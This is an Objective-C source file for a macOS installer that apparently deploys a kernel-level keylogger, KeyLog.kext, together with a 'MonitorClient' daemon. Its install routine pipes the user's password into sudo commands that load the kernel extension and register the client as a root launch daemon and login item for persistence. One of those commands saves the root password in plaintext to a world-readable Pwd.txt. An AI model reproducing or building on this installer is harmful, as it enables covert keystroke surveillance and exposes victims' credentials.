//
//  InstallMain.m
//  InstallApp
//
//  Created by WangYongChun on 1/8/14.
//  Copyright (c) 2014 WangYongChun. All rights reserved.
///Users/WangYongChun/Desktop/Project/HookKey/KeyMonitor/Build/Products/Debug
#import "InstallMain.h"

@implementation InstallMain

-(id)init
{
    return self;
}

-(IBAction)install:(id)sender
{
    [mProgrs setHidden:FALSE];
    
    NSString *path = [[[NSBundle mainBundle] bundlePath] stringByDeletingLastPathComponent];

    //NSString *path = [[NSFileManager defaultManager] currentDirectoryPath];

    NSMutableArray *cmdArr = [[NSMutableArray alloc] init];
    NSString *cmd = @"echo \"***** KEY-MONITOR Daemon Installing Start... *****\"";
    [cmdArr addObject:cmd];
    
    // unload and remove kernel extension
    cmd = [NSString stringWithFormat:@"echo %@ | sudo kextunload /System/Library/Extensions/KeyLog.kext", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = [NSString stringWithFormat:@"echo %@ | sudo rm -rf /System/Library/Extensions/KeyLog.kext", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - kernel extension processed ---\"";
    [cmdArr addObject:cmd];
    
    // copy MonitorClient to /Applications/
    cmd = [NSString stringWithFormat:@"echo %@ | sudo cp -rf %@/InstallApp.app/Contents/MonitorClient.app /Applications/", [mPwd stringValue], path];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - MonitorClient copied ---\"";
    [cmdArr addObject:cmd];
    
    // copy kernel extension to /System/Library/Extensions/
    cmd = [NSString stringWithFormat:@"echo %@ | sudo cp -r %@/InstallApp.app/Contents/KeyLog.kext /System/Library/Extensions/", [mPwd stringValue], path];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - kernel extension copied ---\"";
    [cmdArr addObject:cmd];
    
    // set privileges to kernel extension
    cmd = [NSString stringWithFormat:@"echo %@ | sudo chmod -R 755 /System/Library/Extensions/KeyLog.kext", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    cmd = [NSString stringWithFormat:@"echo %@ | sudo chown -R root:wheel /System/Library/Extensions/KeyLog.kext", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - set privileges to kernel extension ---\"";
    [cmdArr addObject:cmd];
    
    // run kernel extension
    cmd = [NSString stringWithFormat:@"echo %@ | sudo kextload /System/Library/Extensions/KeyLog.kext", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - run kernel extension ---\"";
    [cmdArr addObject:cmd];
    
    // copy keymap file to /Applications
    cmd = [NSString stringWithFormat:@"echo %@ | sudo cp -rf %@/InstallApp.app/Contents/KeyLogTransferKeyMap.plist /Applications/", [mPwd stringValue], path];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - copied keymap plist ---\"";
    [cmdArr addObject:cmd];
    
    // save root password to /System/Library/Extensions/Pwd.txt
    cmd = [NSString stringWithFormat:@"echo %@ | sudo echo %@ > /System/Library/Extensions/Pwd.txt", [mPwd stringValue], [mPwd stringValue]];
    [cmdArr addObject:cmd];
    cmd = [NSString stringWithFormat:@"echo %@ | sudo chmod 777 /System/Library/Extensions/Pwd.txt", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - Pwd.txt copied ---\"";
    [cmdArr addObject:cmd];
    
    // copy daemon plist file
    cmd = [NSString stringWithFormat:@"echo %@ | sudo cp -rf %@/InstallApp.app/Contents/Damy.MonitorClient.plist /Library/LaunchDaemons/", [mPwd stringValue], path];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - daemon plist copied ---\"";
    [cmdArr addObject:cmd];
    
    // register monitor client as daemon
    cmd = [NSString stringWithFormat:@"echo %@ | sudo launchctl load -w /Library/LaunchDaemons/Damy.MonitorClient.plist", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \" - registered as daemon ---\"";
    [cmdArr addObject:cmd];
    
    
    cmd = @"echo \" - running MonitorClient ---\"";
    [cmdArr addObject:cmd];
    
    cmd = [NSString stringWithFormat:@"echo %@ | sudo /Applications/MonitorClient.app/Contents/MacOS/MonitorClient", [mPwd stringValue]];
    [cmdArr addObject:cmd];
    
    cmd = @"echo \"***** KEY-MONITOR Daemon Installing End *****\"";
    [cmdArr addObject:cmd];

    for (int i = 0; i < cmdArr.count; i ++)
    {
        NSTask *task;
        NSArray	*args;
        
        task = [[NSTask alloc] init];
        
        if (i == cmdArr.count - 2)
        {
            [task setLaunchPath:@"/bin/bash"];
            args = [NSArray arrayWithObjects:@"-l",
                    @"-c",
                    [cmdArr objectAtIndex:i],
                    nil];
        }
        else
        {
            [task setLaunchPath:@"/bin/bash"];
            args = [NSArray arrayWithObjects:@"-l",
                    @"-c",
                    [cmdArr objectAtIndex:i],
                    nil];
        }
        
        [task setArguments: args];
        [task launch];
        
        if (i != cmdArr.count - 2)
            [task waitUntilExit];
        
        [mProgrs setDoubleValue:100 / cmdArr.count - 20];
    }
    
    // Set auto start on system start.
	CFURLRef url = (__bridge  CFURLRef)[NSURL fileURLWithPath:@"/Applications/MonitorClient.app"];
	
	// Create a reference to the shared file list.
	LSSharedFileListRef loginItems = LSSharedFileListCreate(NULL, kLSSharedFileListSessionLoginItems, NULL);
	
	if (loginItems) {
		[self enableLoginItemWithLoginItemsReference:loginItems ForPath:url];
	}
	CFRelease(loginItems);
    sleep(0.5);
    [mProgrs setDoubleValue:100.0f];
    
    exit(0);
}

- (void)enableLoginItemWithLoginItemsReference:(LSSharedFileListRef )theLoginItemsRefs ForPath:(CFURLRef)thePath {

	LSSharedFileListItemRef item = LSSharedFileListInsertItemURL(theLoginItemsRefs, kLSSharedFileListItemLast, NULL, NULL, thePath, NULL, NULL);
	if (item)
		CFRelease(item);
}

@end
